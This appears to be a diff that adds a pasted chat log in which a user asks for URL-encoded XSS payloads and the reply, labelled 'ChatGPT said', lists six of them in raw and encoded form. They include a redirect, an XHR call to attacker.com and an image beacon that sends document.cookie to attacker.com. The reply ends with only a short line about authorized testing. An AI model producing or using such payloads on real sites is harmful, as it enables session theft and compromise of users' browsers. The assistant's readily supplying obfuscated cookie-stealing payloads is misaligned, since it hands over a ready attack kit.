@@ -1,1 +1,35 @@
 <script>alert(document.cookie);</script>
+
+create multiple payloads for XSS by applying URL encoding
+ChatGPT said:
+URL encoding (also known as percent-encoding) is a mechanism for encoding special characters in a URL by replacing them with a percent sign (%) followed by two hexadecimal digits. 
+This is commonly used to encode characters that have special meanings in URLs, such as whitespace or symbols.
+
+Below are examples of multiple payloads for XSS (Cross-Site Scripting) attacks, with each payload applying URL encoding to obfuscate the malicious JavaScript code:
+
+    Simple Alert Payload:
+        Payload: "><script>alert(1)</script>
+        URL Encoded: %22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+    Image Source Payload:
+        Payload: "><img src=x onerror=alert(1)>
+        URL Encoded: %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+
+    Document Cookie Payload:
+        Payload: "><script>alert(document.cookie)</script>
+        URL Encoded: %22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+    Redirect Payload:
+        Payload: "><script>window.location='https://example.com'</script>
+        URL Encoded: %22%3E%3Cscript%3Ewindow.location%3D%27https%3A%2F%2Fexample.com%27%3C%2Fscript%3E
+
+    XHR Payload:
+        Payload: "><script>var xhr=new XMLHttpRequest();xhr.open('GET','https://attacker.com',true);xhr.send();</script>
+        URL Encoded: %22%3E%3Cscript%3Evar%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27https%3A%2F%2Fattacker.com%27%2Ctrue%29%3Bxhr.send%28%29%3B%3C%2Fscript%3E
+
+    Steal Credentials Payload:
+        Payload: "><script>var img=new Image();img.src='https://attacker.com/?cookie='+document.cookie;</script>
+        URL Encoded: %22%3E%3Cscript%3Evar%20img%3Dnew%20Image%28%29%3Bimg.src%3D%27https%3A%2F%2Fattacker.com%2F%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
+
+These payloads can be injected into vulnerable web application parameters (e.g., input fields, URL parameters) to execute arbitrary JavaScript code in the context of the victim's browser. 
+Remember to use them responsibly and only in environments where you have permission to conduct security testing. Unauthorized use of XSS payloads can have legal consequences.
